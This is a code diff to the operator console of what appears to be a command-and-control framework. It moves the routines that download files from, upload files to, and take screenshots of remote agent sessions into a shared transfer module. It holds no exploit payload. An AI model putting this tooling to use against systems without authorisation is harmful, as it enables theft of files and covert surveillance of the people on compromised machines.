@@ -22,6 +22,7 @@ import time
 from typing import Any, Dict, List, Optional
 
 from pupyteer.server.sessions.manager import SessionState
+from pupyteer.server.sessions import transfer
 
 logger = logging.getLogger("pupyteer.tui.commands.sessions")
 
@@ -129,11 +130,10 @@ async def sessions_download(tui: Any, args: List[str]) -> Dict[str, Any]:
 
     Usage: sessions download <id> <remote-path> [local-path]
 
-    fs_get on its own prints base64 into the terminal, which is useless for
-    anything but a small text file; this reassembles the pieces to disk.
+    The chunking itself lives in `server/sessions/transfer.py`, which the file
+    modules use too: two copies of a reassembly loop is two chances for one of
+    them to report bytes that never arrived.
     """
-    import base64
-    import json
     import os
 
     if len(args) < 2:
@@ -150,44 +150,26 @@ async def sessions_download(tui: Any, args: List[str]) -> Dict[str, Any]:
         tui.render_error(f"Session not found: {session_id}")
         return {"status": "error", "error": f"Session not found: {session_id}"}
 
-    timeout = interaction_timeout(tui)
-    chunk_size = 512 * 1024
-    offset = 0
-    total = -1
     parent = os.path.dirname(os.path.abspath(local))
     os.makedirs(parent, exist_ok=True)
+
+    def report(done: int, total: int) -> None:
+        tui.render_success(f"  {done}/{total} bytes")
 
     # Written incrementally: a target-side file can be larger than the
     # operator's memory, and each chunk is already on the wire.
     with open(local, "wb") as sink:
-        while True:
-            line = json.dumps({"action": "fs_get", "path": remote,
-                               "offset": offset, "length": chunk_size})
-            raw = await _run_agent_command(engine, session_id, line, timeout)
-            if raw is None:
-                tui.render_error("Agent did not answer the download request (still beacons?).")
-                return {"status": "error", "error": "download timed out"}
-            try:
-                payload = json.loads(raw)
-            except json.JSONDecodeError:
-                tui.render_error(f"Agent returned an unreadable chunk: {raw[:200]}")
-                return {"status": "error", "error": "unreadable chunk"}
-            if "error" in payload:
-                tui.render_error(f"Download failed: {payload['error']}")
-                return {"status": "error", "error": payload["error"]}
+        outcome = await transfer.pull(
+            engine.sessions, session_id, remote, sink,
+            timeout=interaction_timeout(tui), progress=report)
 
-            data = base64.b64decode(payload.get("data", ""))
-            if not data:
-                break
-            sink.write(data)
-            total = payload.get("size", -1)
-            offset += len(data)
-            if payload.get("eof") or (total >= 0 and offset >= total):
-                break
-            tui.render_success(f"  {offset}/{total} bytes")
+    if outcome["status"] != "ok":
+        tui.render_error(f"Download failed: {outcome['error']}")
+        return {"status": "error", "error": outcome["error"]}
 
-    tui.render_success(f"Saved {offset} bytes to {local}")
-    return {"status": "ok", "session_id": session_id, "local": local, "bytes": offset}
+    tui.render_success(f"Saved {outcome['bytes']} bytes to {local}")
+    return {"status": "ok", "session_id": session_id, "local": local,
+            "bytes": outcome["bytes"]}
 
 
 async def sessions_upload(tui: Any, args: List[str]) -> Dict[str, Any]:
@@ -195,8 +177,6 @@ async def sessions_upload(tui: Any, args: List[str]) -> Dict[str, Any]:
 
     Usage: sessions upload <id> <local-path> <remote-path>
     """
-    import base64
-    import json
     import os
 
     if len(args) < 3:
@@ -208,45 +188,21 @@ async def sessions_upload(tui: Any, args: List[str]) -> Dict[str, Any]:
     if await engine.sessions.get(session_id) is None:
         tui.render_error(f"Session not found: {session_id}")
         return {"status": "error", "error": f"Session not found: {session_id}"}
-    if not os.path.isfile(local):
-        tui.render_error(f"Local file not found: {local}")
-        return {"status": "error", "error": f"Local file not found: {local}"}
 
-    timeout = interaction_timeout(tui)
-    chunk_size = 512 * 1024
-    size = os.path.getsize(local)
-    offset = 0
+    def report(done: int, total: int) -> None:
+        tui.render_success(f"  {done}/{total} bytes")
 
-    with open(local, "rb") as fh:
-        while True:
-            data = fh.read(chunk_size)
-            if not data:
-                break
-            task = {
-                "action": "fs_put",
-                "path": remote,
-                "offset": offset,
-                "data": base64.b64encode(data).decode(),
-            }
-            raw = await _run_agent_command(
-                engine, session_id, json.dumps(task), timeout
-            )
-            if raw is None:
-                tui.render_error("Agent did not answer the upload request.")
-                return {"status": "error", "error": "upload timed out"}
-            try:
-                reply = json.loads(raw)
-            except json.JSONDecodeError:
-                tui.render_error(f"Agent returned an unreadable reply: {raw[:200]}")
-                return {"status": "error", "error": "unreadable reply"}
-            if not reply.get("ok"):
-                tui.render_error(f"Upload failed: {reply.get('error', 'unknown')}")
-                return {"status": "error", "error": reply.get("error", "upload refused")}
-            offset += len(data)
-            tui.render_success(f"  {offset}/{size} bytes")
+    outcome = await transfer.push(
+        engine.sessions, session_id, local, remote,
+        timeout=interaction_timeout(tui), progress=report)
 
-    tui.render_success(f"Uploaded {offset} bytes to {remote}")
-    return {"status": "ok", "session_id": session_id, "remote": remote, "bytes": offset}
+    if outcome["status"] != "ok":
+        tui.render_error(f"Upload failed: {outcome['error']}")
+        return {"status": "error", "error": outcome["error"]}
+
+    tui.render_success(f"Uploaded {outcome['bytes']} bytes to {remote}")
+    return {"status": "ok", "session_id": session_id, "remote": remote,
+            "bytes": outcome["bytes"]}
 
 
 async def sessions_screenshot(tui: Any, args: List[str]) -> Dict[str, Any]:
@@ -273,9 +229,13 @@ async def sessions_screenshot(tui: Any, args: List[str]) -> Dict[str, Any]:
         tui.render_error(f"Session not found: {session_id}")
         return {"status": "error", "error": f"Session not found: {session_id}"}
 
-    raw = await _run_agent_command(
+    answered = await _run_agent_command(
         engine, session_id, json.dumps({"action": "screenshot"}), interaction_timeout(tui)
     )
+    if answered.get("error"):
+        tui.render_error(answered["error"])
+        return {"status": "error", "error": answered["error"]}
+    raw = answered["output"]
     if raw is None:
         tui.render_error("Agent did not answer the capture request (still beacons?).")
         return {"status": "error", "error": "screenshot timed out"}
@@ -303,12 +263,14 @@ async def sessions_screenshot(tui: Any, args: List[str]) -> Dict[str, Any]:
     return {"status": "ok", "session_id": session_id, "local": local, "bytes": len(data)}
 
 
-async def _run_agent_command(engine: Any, session_id: str, command: str, timeout: float) -> Optional[str]:
-    """Queue one command and wait for the agent's answer."""
-    command_id = await engine.sessions.interact(session_id, command)
-    if not command_id:
-        return None
-    return await _await_command_result(engine, session_id, command_id, timeout)
+async def _run_agent_command(engine: Any, session_id: str, command: str, timeout: float) -> Dict[str, Any]:
+    """Queue one command and wait, returning ``{"command_id", "output"[, "error"]}``.
+
+    ``output`` is None when the agent never answered; ``error`` means the command
+    was not queued at all.
+    """
+    return await transfer.run_command(
+        engine.sessions, session_id, command, timeout=timeout)
 
 
 def interaction_timeout(tui: Any) -> float:
@@ -328,15 +290,8 @@ async def _await_command_result(
     Returns None if the deadline passes first — the agent may simply be
     between beacons, which is not an error.
     """
-    deadline = time.time() + timeout
-    while time.time() < deadline:
-        for entry in await engine.sessions.get_pending_commands(session_id):
-            if entry.get("command_id") != command_id:
-                continue
-            if entry.get("status") == "completed":
-                return entry.get("result") or ""
-        await asyncio.sleep(0.25)
-    return None
+    return await transfer.wait_for_command(
+        engine.sessions, session_id, command_id, timeout)
 
 
 def _print_result(output: str) -> None:
@@ -543,14 +498,32 @@ async def sessions_route(tui: Any, args: List[str]) -> Dict[str, Any]:
         "SESSION_USER": session.username,
     }
 
-    result = await registry.execute(module_name, session, args_dict)
+    result = await registry.execute(
+        module_name, session, args_dict,
+        session_manager=tui._engine.sessions)
 
     if result.get("status") == "ok":
-        tui.render_success(f"Module '{module_name}' executed on session {session_id}")
+        tui.render_success(
+            f"Module '{module_name}' executed on session {session_id}")
     else:
         tui.render_error(f"Module execution failed: {result.get('error', 'unknown')}")
 
-    return {"status": result.get("status", "error"), "module": module_name, "session_id": session_id, "result": result}
+    # `_render_msf_result` prints what it is handed, so the answer has to be at
+    # this level: a module that ran but whose output stayed one dict deeper reads
+    # to the operator exactly like one that found nothing.
+    envelope: Dict[str, Any] = {
+        "status": result.get("status", "error"),
+        "module": module_name,
+        "session_id": session_id,
+        "result": result,
+    }
+    if result.get("status") == "ok":
+        envelope["data"] = {
+            k: v for k, v in result.items() if k not in ("status", "error")
+        }
+    else:
+        envelope["error"] = result.get("error", "unknown")
+    return envelope
 
 
 # ─── Command Mapping ─────────────────────────────────────────────────
